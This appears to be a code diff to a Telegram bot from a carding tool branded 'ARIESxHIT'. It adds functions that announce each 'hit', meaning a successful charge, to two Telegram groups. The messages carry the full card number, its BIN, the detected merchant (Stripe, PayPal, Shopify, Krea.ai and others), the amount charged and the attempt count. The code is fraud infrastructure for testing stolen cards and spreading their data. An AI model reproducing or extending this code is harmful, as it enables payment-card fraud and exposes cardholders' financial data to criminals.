@@ -494,6 +494,98 @@ const MAIN_MENU_KEYBOARD = {
   ],
 };
 
+// Send hit notification to group chats
+async function sendHitToGroups(hitData, checkoutUrl) {
+  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+  const GROUP_1 = process.env.TELEGRAM_GROUP_1; // ARIESxHIT Chat - Simple format
+  const GROUP_2 = process.env.TELEGRAM_GROUP_2; // Aries Hits - Detailed format
+
+  if (!BOT_TOKEN) return;
+
+  // Detect merchant name
+  const merchantName = detectMerchant(checkoutUrl);
+
+  // Format for Group 1 (Simple)
+  if (GROUP_1) {
+    const group1Message = `🎯 𝗛𝗜𝗧 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗
+─────────────────
+
+Name :- <a href="tg://user?id=${hitData.userId}">${hitData.userName}</a>
+Amount :- $${hitData.amount}
+Attempt :- ${hitData.attempts}
+Time :- ${hitData.timeTaken}
+
+─────────────────
+Thanks For Using Ariesxhit. 💗`;
+
+    try {
+      await sendMessage(BOT_TOKEN, GROUP_1, group1Message);
+      console.log(`✅ Hit notification sent to Group 1 (${GROUP_1})`);
+    } catch (error) {
+      console.error('❌ Failed to send to Group 1:', error);
+    }
+  }
+
+  // Format for Group 2 (Detailed)
+  if (GROUP_2) {
+    const bin = hitData.bin || extractBinFromCard(hitData.card);
+    const binSource = hitData.binMode ? hitData.binMode : ` (hit using card list)`;
+
+    const group2Message = `🎯 𝗛𝗜𝗧 𝗗𝗘𝗧𝗘𝗖𝗧𝗘𝗗
+─────────────────
+
+「❃」 Name :- <a href="tg://user?id=${hitData.userId}">${hitData.userName}</a>
+「❃」 Card :- ${hitData.card}
+「❃」 Bin :- ${bin}${binSource}
+「❃」 Merchant :- ${merchantName}
+「❃」 Email :- cardernarutov3@gmail.com
+「❃」 Amount :- $${hitData.amount}
+「❃」 Response : Charged
+「❃」 Attempt :- ${hitData.attempts}
+「❃」 Time :- ${hitData.timeTaken}
+
+─────────────────
+Thanks For Using Ariesxhit. 💗`;
+
+    try {
+      await sendMessage(BOT_TOKEN, GROUP_2, group2Message);
+      console.log(`✅ Hit notification sent to Group 2 (${GROUP_2})`);
+    } catch (error) {
+      console.error('❌ Failed to send to Group 2:', error);
+    }
+  }
+}
+
+// Detect merchant name from checkout URL
+function detectMerchant(checkoutUrl) {
+  if (!checkoutUrl) return 'Unknown';
+
+  const url = checkoutUrl.toLowerCase();
+
+  if (url.includes('krea.ai') || url.includes('krea')) return 'Krea.ai';
+  if (url.includes('stripe.com')) return 'Stripe Checkout';
+  if (url.includes('paypal')) return 'PayPal';
+  if (url.includes('shopify')) return 'Shopify';
+  if (url.includes('woocommerce')) return 'WooCommerce';
+
+  // Try to extract domain name
+  try {
+    const urlObj = new URL(checkoutUrl);
+    const domain = urlObj.hostname.replace('www.', '').replace('pay.', '');
+    return domain.charAt(0).toUpperCase() + domain.slice(1);
+  } catch (e) {
+    return 'Unknown Merchant';
+  }
+}
+
+// Extract BIN from card number
+function extractBinFromCard(cardNumber) {
+  if (!cardNumber) return 'Unknown';
+  // Remove spaces and get first 6 digits
+  const cleanCard = cardNumber.replace(/\s/g, '');
+  return cleanCard.substring(0, 6);
+}
+
 module.exports = {
   setDatabase,
   sendMessage,
@@ -520,4 +612,7 @@ module.exports = {
   approveUser,
   isUserApproved,
   getUserApprovalInfo,
+  sendHitToGroups,
+  detectMerchant,
+  extractBinFromCard,
 };
